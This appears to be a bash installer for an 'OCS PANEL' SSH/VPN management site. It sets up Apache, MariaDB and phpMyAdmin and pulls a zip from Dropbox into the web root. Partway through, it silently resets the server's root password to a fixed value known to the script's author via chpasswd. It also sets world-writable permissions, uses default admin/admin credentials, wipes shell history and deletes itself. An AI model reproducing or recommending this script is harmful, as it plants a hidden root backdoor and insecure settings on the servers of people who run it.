#!/bin/bash
rm -f wget-log
rm -f wget-log.1
rm -f wget-log.2
rm -f wget-log.3
rm -f wget-log.4
rm -f wget-log.5
function inst_base {
apt-get update > /dev/null 2>&1
apt-get dist-upgrade -y > /dev/null 2>&1
apt-get install apache2 -y > /dev/null 2>&1
apt-get install php libapache2-mod-php7.0 php7.0-mcrypt curl php-curl php7.0-mbstring -y > /dev/null 2>&1
systemctl restart apache2
apt-get install mariadb-server -y > /dev/null 2>&1
mysqladmin -u root password "thirdy19966"
mysql -u root -p"thirdy19966" -e "UPDATE mysql.user SET Password=PASSWORD('thirdy19966') WHERE User='root'"
mysql -u root -p"thirdy19966" -e "DELETE FROM mysql.user WHERE User=''"
mysql -u root -p"thirdy19966" -e "DELETE FROM mysql.db WHERE Db='test' OR Db='test\_%'"
mysql -u root -p"thirdy19966" -e "FLUSH PRIVILEGES"
mysql -u root -p"thirdy19966" -e "CREATE USER 'plus'@'localhost';'"
mysql -u root -p"thirdy19966" -e "CREATE DATABASE plus;"
mysql -u root -p"thirdy19966" -e "GRANT ALL PRIVILEGES ON plus.* To 'plus'@'localhost' IDENTIFIED BY 'thirdy19966';"
mysql -u root -p"thirdy19966" -e "FLUSH PRIVILEGES"
echo "[mysqld]
max_connections = 900" >> /etc/mysql/my.cnf
apt-get install php-mysql -y > /dev/null 2>&1
phpenmod mcrypt
systemctl restart apache2
ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin
apt-get install php-ssh2 -y > /dev/null 2>&1
php -m | grep ssh2 > /dev/null 2>&1
curl -sS https://getcomposer.org/installer | php
mv composer.phar /usr/local/bin/composer
chmod +x /usr/local/bin/composer
cd /var/www/html
wget https://www.dropbox.com/s/3srb89uswhpz0ks/ocs.zip > /dev/null 2>&1
apt-get install unzip > /dev/null 2>&1
unzip ocs.zip > /dev/null 2>&1
chmod -R 777 /var/www/html/admin
chmod -R 777 /var/www/html/pages
chmod -R 777 /var/www/html/backups
rm ocs.zip index.html > /dev/null 2>&1
composer install
composer require phpseclib/phpseclib:~2.0
systemctl restart mysql
clear
}
function phpmadm {
cd /usr/share
wget https://files.phpmyadmin.net/phpMyAdmin/4.8.2/phpMyAdmin-4.8.2-all-languages.zip > /dev/null 2>&1
unzip phpMyAdmin-4.8.2-all-languages.zip > /dev/null 2>&1
mv phpMyAdmin-4.8.2-all-languages phpmyadmin
chmod -R 0755 phpmyadmin
ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin
service apache2 restart 
rm phpMyAdmin-4.8.2-all-languages.zip
cd /root
}

function pconf { 
sed "s/SENHA/thirdy19966/" /var/www/html/pages/system/pass.php > /tmp/pass
mv /tmp/pass /var/www/html/pages/system/pass.php

}
function inst_db { 
IP=$(wget -qO- ipv4.icanhazip.com)
curl $IP/create.php > /dev/null 2>&1
rm /var/www/html/create.php /var/www/html/plus.sql
}
function cron_set {
crontab -l > cronset
echo "
*/2 * * * * /usr/bin/php /var/www/html/pages/system/cron.php
*/2 * * * * /usr/bin/php /var/www/html/pages/system/cron.ssh.php
*/2 * * * * /usr/bin/php /var/www/html/pages/system/cron.online.ssh.php
0 */3 * * * /usr/bin/php /var/www/html/pages/system/cron.servidor.php
*/30 * * * * /usr/bin/php /var/www/html/pages/system/cron.limpeza.php
0 */12 * * * cd /var/www/html/pages/system/ && bash cron.backup.sh && cd /root
5 */12 * * * cd /var/www/html/pages/system/ && /usr/bin/php cron.backup.php && cd /root" > cronset
crontab cronset && rm cronset
} 
echo "America/Sao_Paulo" > /etc/timezone
ln -fs /usr/share/zoneinfo/America/Sao_Paulo /etc/localtime > /dev/null 2>&1
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null 2>&1
clear
echo -e "\E[44;1;37m       OCS PANEL XVPNX       \E[0m"
echo ""
echo "root:thirdy19966" | chpasswd
echo "Submit Succesfully!" 
echo "..................."
echo "Installing... please wait 2-3 minutes."
echo ""
echo "For more free autoscript"
echo "Powered By : PHTambayan"
echo "Modified by : ThirdyMocky"
sleep 2
inst_base
phpmadm
pconf
inst_db
cron_set
clear
echo -e "\E[44;1;37m           OCS PANEL XVPNX            \E[0m"
echo ""
echo -e "COPYRIGHT 2018 | PHTambayan"
echo ""
echo -e "PANEL : \033[1;33mhttp://$IP/\033[0m"
echo -e "Admin User: \033[1;33madmin\033[0m"
echo -e "Admin Pass: \033[1;33madmin\033[0m"
echo ""
cat /dev/null > ~/.bash_history && history -c
rm -f wget-log*
rm ocs.sh
